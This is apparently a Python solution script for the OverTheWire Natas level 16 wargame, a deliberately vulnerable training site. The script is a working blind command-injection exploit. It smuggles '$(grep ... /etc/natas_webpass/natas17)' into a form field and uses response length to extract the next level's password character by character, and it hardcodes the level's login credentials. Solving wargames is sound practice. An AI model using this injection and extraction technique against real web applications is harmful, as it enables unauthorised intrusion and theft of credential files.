import requests
from requests.auth import HTTPBasicAuth

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
filtered = "abdfhjkotuxAGIKLMTVYZ35678"
passwd = ""

for char in chars:
    Data = {'needle': 'apple$(grep ' + char + ' /etc/natas_webpass/natas17)'}
    req = requests.post('http://natas16.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas16', 'Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb'), data=Data)

    if len(req.text) == 1105:
        filtered = filtered + char
        print(filtered)


for i in range(0,32):
    print(f"Current passwd: '{passwd}'")
    for char in filtered:
        payload = 'apple$(grep ^' + passwd + char + ' /etc/natas_webpass/natas17)'
        # print(f"Test: {payload}")
        Data = {'needle': payload}
        req = requests.post('http://natas16.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas16', 'Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb'), data=Data)
        print(f"Response len: {len(req.text)}")

        if len(req.text) == 1105:
            passwd = passwd + char
            print(passwd)
            break
            
# Data = {'needle': 'apple$(grep e /etc/natas_webpass/natas17)'}
# req = requests.post('http://natas16.natas.labs.overthewire.org/index.php', auth=HTTPBasicAuth('natas16', 'Xm6XEeRN3zsGjRDqBPmuqAVV65k7e3Gb'), data=Data)
# print(len(req.text))
